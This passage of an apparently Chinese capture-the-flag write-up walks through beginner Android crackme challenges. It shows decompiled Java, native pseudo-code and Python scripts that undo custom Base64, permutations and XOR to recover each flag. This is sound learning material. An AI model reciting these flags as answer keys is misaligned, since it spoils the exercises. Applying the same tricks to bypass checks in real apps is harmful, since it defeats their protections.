i) { // 打开指定数据库        super(context, str, cursorFactory, i);    }    public void onCreate(SQLiteDatabase sQLiteDatabase) {        sQLiteDatabase.execSQL(&quot;create table TencentMicrMsg(name text,password integer,F_l_a_g text)&quot;); // 表TencentMicrMsg中三个字段分别是text、integer和text    }    public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {    }}</code></pre><p>在包 a 下的 a 类，其中两个函数可以根据 b 类的函数分析得到功能：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;/* compiled from: Cipher */public class a {    private String a = &quot;yaphetshan&quot;;    public String a(String str, String str2) {        String substring = str.substring(0, 4);        return substring + str2.substring(0, 4);    }    public String b(String str, String str2) { // 返回MD5十六进制字符串        b bVar = new b();        return b.a(str);    }    public String a(String str) { // 返回SHA1(str+&quot;yaphetshan&quot;)的十六进制字符串        b bVar = new b();        return b.b(str + this.a);    }}</code></pre><p>包 a 下的 b 类，根据 MessageDigest 创建的实例可以分别判断出是获取 MD5 和 SHA-1 的十六进制摘要：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;import java.security.MessageDigest;/* compiled from: SHA1Manager */public class b {    public static final String a(String str) { // 获取MD5十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;MD5&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取MD5哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }    public static final String b(String str) { // 获取SHA1十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;SHA-1&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取SHA1哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }}</code></pre><p>那么根据上面的分析可以正向地得到密码：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()sha1hash = lambda m: hashlib.sha1(m).hexdigest()name = &quot;Stranger&quot;password = &quot;123456&quot;a = name[:4] + password[:4]database = sha1hash(a + md5hash(a) + &quot;yaphetshan&quot;)[:7]print database# ae56f99</code></pre><p>打开 Decypt.db 库，查看表中数据：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/1.png" srcset="/img/loading.gif" alt></p><p>将字段中的字符串解 base64：</p><pre><code class="bash">$ echo &quot;VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=&quot; | base64 -DTctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</code></pre><h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h1><p>把 apk 拖进 jadx，反编译查看入口事件代码，判断出对输入进行了 Base64 加密：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;)) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>再看看 Base64New 类中代码，发现是一个换表的 base64：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;public class Base64New {    private static final char[] Base64ByteToStr = new char[]{&#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;y&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;8&#39;, &#39;9&#39;, &#39;+&#39;, &#39;/&#39;};    private static final int RANGE = 255;    private static byte[] StrToBase64Byte = new byte[AccessibilityNodeInfoCompat.ACTION_CLEAR_ACCESSIBILITY_FOCUS];    public String Base64Encode(byte[] bytes) {        StringBuilder res = new StringBuilder();        for (int i = 0; i &lt;= bytes.length - 1; i += 3) {            int k;            byte[] enBytes = new byte[4];            byte tmp = (byte) 0;            for (k = 0; k &lt;= 2; k++) {                if (i + k &lt;= bytes.length - 1) {                    enBytes[k] = (byte) (((bytes[i + k] &amp; RANGE) &gt;&gt;&gt; ((k * 2) + 2)) | tmp);                    tmp = (byte) ((((bytes[i + k] &amp; RANGE) &lt;&lt; (((2 - k) * 2) + 2)) &amp; RANGE) &gt;&gt;&gt; 2);                } else {                    enBytes[k] = tmp;                    tmp = (byte) 64;                }            }            enBytes[3] = tmp;            for (k = 0; k &lt;= 3; k++) {                if (enBytes[k] &lt;= (byte) 63) {                    res.append(Base64ByteToStr[enBytes[k]]);                } else {                    res.append(&#39;=&#39;);                }            }        }        return res.toString();    }}</code></pre><p>直接改表解码：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from utils import *base64_charset = &#39;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/=&#39;ciphertext = &#39;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&#39;plaintext = decipher(ciphertext)print plaintext# 05397c42f9b6da593a3644162d36eb01</code></pre><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>jadx 反编译，MainActivity 中看到主要是 <code>b()</code> 函数判断了 flag 的格式，下面主要是把 a 和 b 两个类的构造函数理清：</p><pre><code class="java">package com.a.easyjava;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;import java.util.Timer;import java.util.TimerTask;public class MainActivity extends c {    private static char a(String str, b bVar, a aVar) {        return aVar.a(bVar.a(str));    }    private static Boolean b(String str) {        int i = 0;        if (!str.startsWith(&quot;flag{&quot;)) {            return Boolean.valueOf(false);        }        if (!str.endsWith(&quot;}&quot;)) {            return Boolean.valueOf(false);        }        String substring = str.substring(5, str.length() - 1);        b bVar = new b(Integer.valueOf(2));        a aVar = new a(Integer.valueOf(3));        StringBuilder stringBuilder = new StringBuilder();        int i2 = 0;        while (i &lt; substring.length()) {            stringBuilder.append(a(substring.charAt(i) + &quot;&quot;, bVar, aVar));            Integer valueOf = Integer.valueOf(bVar.b().intValue() / 25); // 将bVar中d的值除以25并赋值给valueOf            if (valueOf.intValue() &gt; i2 &amp;&amp; valueOf.intValue() &gt;= 1) {                i2++;            }            i++;        }        return Boolean.valueOf(stringBuilder.toString().equals(&quot;wigwrkaugala&quot;));    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (MainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                    return;                }                Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                new Timer().schedule(new TimerTask(this) {                    final /* synthetic */ AnonymousClass1 a;                    {                        this.a = r1;                    }                    public void run() {                        System.exit(1);                    }                }, 2000);            }        });    }}</code></pre><p>a 类的构造函数，是对数组 c 的重新排列。然后在 <code>a()</code> 函数中对输入的数字和下标进行转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class a {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(7), Integer.valueOf(14), Integer.valueOf(16), Integer.valueOf(21), Integer.valueOf(4), Integer.valueOf(24), Integer.valueOf(25), Integer.valueOf(20), Integer.valueOf(5), Integer.valueOf(15), Integer.valueOf(9), Integer.valueOf(17), Integer.valueOf(6), Integer.valueOf(13), Integer.valueOf(3), Integer.valueOf(18), Integer.valueOf(12), Integer.valueOf(10), Integer.valueOf(19), Integer.valueOf(0), Integer.valueOf(22), Integer.valueOf(2), Integer.valueOf(11), Integer.valueOf(23), Integer.valueOf(1), Integer.valueOf(8)};    public a(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一        if (d.intValue() == 25) { // 判断d是否等于25            int intValue = ((Integer) a.get(0)).intValue();            a.remove(0);            a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位            d = Integer.valueOf(0); // 将d设置成0        }    }    public char a(Integer num) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (num.intValue() == -10) { // 判断num是否为-10            a();            return &quot; &quot;.charAt(0);        }        while (i &lt; a.size() - 1) {            if (a.get(i) == num) {                valueOf = Integer.valueOf(i); // 获取a中等于num的元素，并将valueOf设置成其下标i            }            i++;        }        a();        return b.charAt(valueOf.intValue()); // 返回下标对应的b中的字符    }}</code></pre><p>b 类中同理，也是对下标的一个转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class b {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(8), Integer.valueOf(25), Integer.valueOf(17), Integer.valueOf(23), Integer.valueOf(7), Integer.valueOf(22), Integer.valueOf(1), Integer.valueOf(16), Integer.valueOf(6), Integer.valueOf(9), Integer.valueOf(21), Integer.valueOf(0), Integer.valueOf(15), Integer.valueOf(5), Integer.valueOf(10), Integer.valueOf(18), Integer.valueOf(2), Integer.valueOf(24), Integer.valueOf(4), Integer.valueOf(11), Integer.valueOf(3), Integer.valueOf(14), Integer.valueOf(19), Integer.valueOf(12), Integer.valueOf(20), Integer.valueOf(13)};    public b(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        int intValue = ((Integer) a.get(0)).intValue();        a.remove(0);        a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位        b += &quot;&quot; + b.charAt(0);        b = b.substring(1, 27); // 将b的第一个元素添加到最后一位        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一    }    public Integer a(String str) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (b.contains(str.toLowerCase())) { // 判断字符串是否在“abcdefghijklmnopqrstuvwxyz”中            Integer valueOf2 = Integer.valueOf(b.indexOf(str)); // str在b中的起始下标            while (i &lt; a.size() - 1) {                if (a.get(i) == valueOf2) { // 获取a中与valueOf2相等的值，并设置valueOf为其下标i                    valueOf = Integer.valueOf(i);                }                i++;            }        } else {            valueOf = str.contains(&quot; &quot;) ? Integer.valueOf(-10) : Integer.valueOf(-1); // 判断字符串中是否有空格，如果有valueOf设置成-10，反之设置成-1        }        a();        return valueOf;    }    public Integer b() {        return d;    }}</code></pre><p>其中有很多条件判断不可能发生，实际的算法逻辑没有反编译出的代码这么复杂。逆向实现脚本：</p><pre><code class="python">#!/usr/bin/env pythonbArray = [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]aArray = [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]ciphertext = &#39;wigwrkaugala&#39;table = &#39;abcdefghijklmnopqrstuvwxyz&#39;valueOfArray = []for i in range(len(ciphertext)):    valueOfArray.append(table.index(ciphertext[i]))print valueOfArraynumArray = []for i in range(len(valueOfArray)):    numArray.append(aArray[valueOfArray[i]])print numArrayprefix = &#39;flag{&#39;suffix = &#39;}&#39;substring = &#39;&#39;for i in range(len(numArray)):    ch = table[bArray[numArray[i]]]    substring += ch    bArray.append(bArray[0])    del bArray[0]    table = (table + table[0])[1:27]flag = prefix + substring + suffixprint flag</code></pre><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p>反编译，其中调用了 a 函数，其中调用了 a 类中的 a 函数和在 libnative.so 实现的 ncheck 函数：</p><pre><code class="java">package com.a.easyjni;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends c {    static {        System.loadLibrary(&quot;native&quot;);    }    private boolean a(String str) {        try {            return ncheck(new a().a(str.getBytes()));        } catch (Exception e) {            return false;        }    }    private native boolean ncheck(String str);    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (this.b.a(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString())) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                } else {                    Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                }            }        });    }}</code></pre><p>a 类里的 a 函数很容易发现是个换表 base64：</p><pre><code class="java">package com.a.easyjni;public class a {    private static final char[] a = new char[]{&#39;i&#39;, &#39;5&#39;, &#39;j&#39;, &#39;L&#39;, &#39;W&#39;, &#39;7&#39;, &#39;S&#39;, &#39;0&#39;, &#39;G&#39;, &#39;X&#39;, &#39;6&#39;, &#39;u&#39;, &#39;f&#39;, &#39;1&#39;, &#39;c&#39;, &#39;v&#39;, &#39;3&#39;, &#39;n&#39;, &#39;y&#39;, &#39;4&#39;, &#39;q&#39;, &#39;8&#39;, &#39;e&#39;, &#39;s&#39;, &#39;2&#39;, &#39;Q&#39;, &#39;+&#39;, &#39;b&#39;, &#39;d&#39;, &#39;k&#39;, &#39;Y&#39;, &#39;g&#39;, &#39;K&#39;, &#39;O&#39;, &#39;I&#39;, &#39;T&#39;, &#39;/&#39;, &#39;t&#39;, &#39;A&#39;, &#39;x&#39;, &#39;U&#39;, &#39;r&#39;, &#39;F&#39;, &#39;l&#39;, &#39;V&#39;, &#39;P&#39;, &#39;z&#39;, &#39;h&#39;, &#39;m&#39;, &#39;o&#39;, &#39;w&#39;, &#39;9&#39;, &#39;B&#39;, &#39;H&#39;, &#39;C&#39;, &#39;M&#39;, &#39;D&#39;, &#39;p&#39;, &#39;E&#39;, &#39;a&#39;, &#39;J&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;N&#39;};    public String a(byte[] bArr) {        StringBuilder stringBuilder = new StringBuilder();        for (int i = 0; i &lt;= bArr.length - 1; i += 3) {            byte[] bArr2 = new byte[4];            byte b = (byte) 0;            for (int i2 = 0; i2 &lt;= 2; i2++) {                if (i + i2 &lt;= bArr.length - 1) {                    bArr2[i2] = (byte) (b | ((bArr[i + i2] &amp; 255) &gt;&gt;&gt; ((i2 * 2) + 2)));                    b = (byte) ((((bArr[i + i2] &amp; 255) &lt;&lt; (((2 - i2) * 2) + 2)) &amp; 255) &gt;&gt;&gt; 2);                } else {                    bArr2[i2] = b;                    b = (byte) 64;                }            }            bArr2[3] = b;            for (int i3 = 0; i3 &lt;= 3; i3++) {                if (bArr2[i3] &lt;= (byte) 63) {                    stringBuilder.append(a[bArr2[i3]]);                } else {                    stringBuilder.append(&#39;=&#39;);                }            }        }        return stringBuilder.toString();    }}</code></pre><p>查看 native 层 ncheck 函数，是静态注册的。理一下发现是个简单的置换：</p><pre><code class="cpp">signed int __fastcall Java_com_a_easyjni_MainActivity_ncheck(_JNIEnv *a1, int a2, jstring a3){  int v3; // r8  _JNIEnv *env; // r5  jstring str; // r8  const char *utf_string; // r6  int i; // r0  char *v8; // r2  char v9; // r1  int j; // r0  bool v11; // nf  unsigned __int8 v12; // vf  int v13; // r1  signed int result; // r0  char s1[32]; // [sp+3h] [bp-35h]  char tmp; // [sp+23h] [bp-15h]  int v17; // [sp+28h] [bp-10h]  v17 = v3;  env = a1;  str = a3;  utf_string = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  if ( strlen(utf_string) == 32 )               // len(str) == 32  {    i = 0;    do    {      v8 = &amp;s1[i];      s1[i] = utf_string[i + 16];               // s1[i] = str[i + 16]      v9 = utf_string[i++];      v8[16] = v9;                              // s1[i + 16] = str[i]    }    while ( i != 16 );    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    j = 0;    do    {      v12 = __OFSUB__(j, 30);      v11 = j - 30 &lt; 0;      tmp = s1[j];      s1[j] = s1[j + 1];      s1[j + 1] = tmp;                          // s1[j], s1[j + 1] = s1[j + 1], s1[j]      j += 2;    }    while ( v11 ^ v12 );                        // while j &lt;= 30    v13 = memcmp(s1, &quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;, 0x20u);    result = 0;    if ( !v13 )      result = 1;  }  else  {    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    result = 0;  }  return result;}</code></pre><p>逆向把位置颠倒的字符串倒回去，再用改表的 base64 解码：</p><pre><code class="python">#!/usr/bin/env pythonfrom base64 import *base64_charset = &#39;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN=&#39;ciphertext = &#39;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#39;ciphertext = [ord(c) for c in ciphertext]for i in range(len(ciphertext) / 2):    ciphertext[2 * i], ciphertext[2 * i + 1] = ciphertext[2 * i + 1], ciphertext[2 * i]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])print ciphertext# QAoOQMPFks1BsB7cbM3TQsXg30i9g3==plaintext = decipher(ciphertext)print plaintext# flag{just_ANot#er_@p3}</code></pre><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>用 jadx 反编译后，看到调用了 cyberpeace 类中的 CheckString 函数：</p><pre><code class="java">package com.testjava.jack.pingan2;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (cyberpeace.CheckString(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString()) == 1) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>看到函数在 Native 层实现：</p><pre><code class="java">package com.testjava.jack.pingan2;public class cyberpeace {    public static native int CheckString(String str);    static {        System.loadLibrary(&quot;cyberpeace&quot;);    }}</code></pre><p>发现是静态实现的函数，其中将输入调用了 TestDec，并将结果和指定字符串比较：</p><pre><code class="cpp">signed int __fastcall Java_com_testjava_jack_pingan2_cyberpeace_CheckString(_JNIEnv *a1, int a2, jstring *str){  signed int v3; // r8  const char *str_1; // r9  int v5; // r6  const char *v6; // r5  signed int v7; // r1  v3 = 0;  str_1 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, str, 0);  v5 = strlen(str_1);  v6 = (const char *)malloc(v5 + 1);  v7 = 0;  if ( v5 != -1 )    v7 = 1;  _aeabi_memclr(&amp;v6[v5], v7);  _aeabi_memcpy((int)v6, (int)str_1, v5);  j_TestDec((int)v6);  if ( !strcmp(v6, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) )    v3 = 1;  return v3;}</code></pre><p>看一下 TestDec 发现和之前一样，也是一组简单置换：</p><pre><code class="cpp">size_t __fastcall TestDec(const char *a1){  char *str; // r4  size_t i; // r5  char *v3; // r1  char v4; // r0  size_t result; // r0  int j; // r5  char *v7; // r0  char v8; // r1  unsigned int v9; // r1  str = (char *)a1;  if ( strlen(a1) &gt;= 2 )  {    i = 0;    do    {      v3 = &amp;str[i];      v4 = str[i];      str[i] = str[i + 16];      ++i;      v3[16] = v4;                              // str[i], str[i + 16] = str[i + 16], str[i]    }    while ( i &lt; strlen(str) &gt;&gt; 1 );  }  result = (unsigned __int8)*str;  if ( !*str )    return result;  *str = str[1];  str[1] = result;                              // str[0], str[1] = str[1], str[0]  result = strlen(str);  if ( result &lt; 3 )    return result;  j = 0;  do  {    v7 = &amp;str[j];    v8 = str[j + 2];    v7[2] = str[j + 3];    v7[3] = v8;                                 // str[j + 2], str[j + 3] = str[j + 3], str[j + 2]    result = strlen(str);    v9 = j + 4;    j += 2;  }  while ( v9 &lt; result );  return result;}</code></pre><p>照样学样逆一下就好了：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;f72c5a36569418a20907b55be5bf95ad&#39;ciphertext = [ord(c) for c in ciphertext]ciphertext[0], ciphertext[1] = ciphertext[1], ciphertext[0]for i in range(len(ciphertext) / 2 - 1):    ciphertext[2 * i + 2], ciphertext[2 * i + 3] = ciphertext[2 * i + 3], ciphertext[2 * i + 2]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextplaintext = &#39;&#39;.join([chr(c) for c in ciphertext])print plaintext# 90705bb55efb59da7fc2a5636549812a</code></pre><h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p>MainActivity 中，encrypt 和 getFlag 函数在 Native 层实现，getSecret 函数返回某种哈希摘要的十六进制字符串。输入经过 encrypt 函数操作后的值与 getFlag 的值相等：</p><pre><code class="java">package com.ph0en1x.android_crackme;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.io.UnsupportedEncodingException;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity {    EditText etFlag;    public native String encrypt(String str);    public native String getFlag();    static {        System.loadLibrary(&quot;phcm&quot;);    }    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.etFlag = (EditText) findViewById(R.id.flag_edit);    }    public void onGoClick(View v) {        if (getSecret(getFlag()).equals(getSecret(encrypt(this.etFlag.getText().toString())))) {            Toast.makeText(this, &quot;Success&quot;, 1).show();        } else {            Toast.makeText(this, &quot;Failed&quot;, 1).show();        }    }    public String getSecret(String string) { // 获取某种哈希摘要的十六进制字符串        try {            byte[] hash = MessageDigest.getInstance(encrypt(&quot;KE3TLNE6M43EK4GM34LKMLETG&quot;).substring(5, 8)).digest(string.getBytes(&quot;UTF-8&quot;));            if (hash != null) {                StringBuilder hex = new StringBuilder(hash.length * 2);                for (byte b : hash) {                    if ((b &amp; MotionEventCompat.ACTION_MASK) &lt; 16) {                        hex.append(&quot;0&quot;);                    }                    hex.append(Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK));                }                return hex.toString();            }        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();        } catch (UnsupportedEncodingException e2) {            e2.printStackTrace();        }        return null;    }}</code></pre><p>在 IDA 中看到静态注册的 encrypt 函数，对字符串的每个值进行了减一操作：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *v3; // r6  const char *v4; // r4  const char *i; // r5  v3 = a1;  v4 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  for ( i = v4; i - v4 &lt; strlen(v4); ++i )    --*i;  return v3-&gt;functions-&gt;NewStringUTF(&amp;v3-&gt;functions, v4);}</code></pre><p>反向加一，得到指定的哈希摘要是 MD5：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()secret_digest = &#39;KE3TLNE6M43EK4GM34LKMLETG&#39;digest_type = &#39;&#39;for i in range(len(secret_digest)):    digest_type += chr(ord(secret_digest[i]) - 1)digest_type = digest_type[5:8]print digest_type# MD5</code></pre><p>接下来看 getFlag 函数，读取内存中 data 的值，在循环中对相邻两个值进行相减并加 1，然后和 key 值异或，最后返回字符串：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(_JNIEnv *a1){  char *v1; // r4  _JNIEnv *v2; // r7  char *v3; // r3  int v4; // r0  int v5; // r1  char *v6; // r2  char *v7; // r3  int v8; // r0  int v9; // r1  int v10; // r4  int v11; // r0  __int16 v12; // r3  signed int l1; // r8  signed int l2; // r0  char *v15; // r9  char a; // r3  char b; // t1  int idx; // r1  char s; // [sp+4h] [bp-5Ch]  char data_1[40]; // [sp+14h] [bp-4Ch]  char v22; // [sp+40h] [bp-20h]  v1 = data_1;  v2 = a1;  v3 = (char *)&amp;data;  do  {    v4 = *(_DWORD *)v3;                         // low 4 bytes    v3 += 8;    v5 = *((_DWORD *)v3 - 1);                   // high 4 bytes    *(_DWORD *)v1 = v4;    *((_DWORD *)v1 + 1) = v5;    v1 += 8;  }  while ( v3 != &quot;Hello Ph0en1x&quot; );  v6 = &amp;s;  v7 = &quot;Hello Ph0en1x&quot;;  do  {    v8 = *(_DWORD *)v7;    v7 += 8;    v9 = *((_DWORD *)v7 - 1);    *(_DWORD *)v6 = v8;    *((_DWORD *)v6 + 1) = v9;    v10 = (int)(v6 + 8);    v6 += 8;  }  while ( v7 != &quot;0en1x&quot; );  v11 = *(_DWORD *)v7;  v12 = *((_WORD *)v7 + 2);  *(_DWORD *)v10 = v11;  *(_WORD *)(v10 + 4) = v12;  l1 = strlen(&amp;s);                              // len(&#39;Hello Ph0en1x&#39;)  l2 = strlen(data_1) - 1;                      // len(data) - 1  v15 = &amp;data_1[l2];  while ( l2 &gt; 0 )  {    a = *v15 + 1;    *v15 = a;                                   // data[l2] = data[l2] + 1    b = *(v15-- - 1);                           // data[l2 - 1]    idx = l2-- % l1;                            // l2 % l1    v15[1] = ((a - b) ^ *(&amp;v22 + idx - 60)) - 1;// data[l2] = ((data[l2 + 1] - data[l2 - 1]) ^ s[idx]) - 1  }  data_1[0] = (data_1[0] ^ 0x48) - 1;  return v2-&gt;functions-&gt;NewStringUTF(&amp;v2-&gt;functions, data_1);}</code></pre><p>因为涉及到了异或和减法的操作，需要注意到及时和 0xFF 与一下，不然结果会出错。脚本：</p><pre><code class="python">data = [0x2E, 0x36, 0x42, 0x4C, 0x5F, 0xBF, 0xE0, 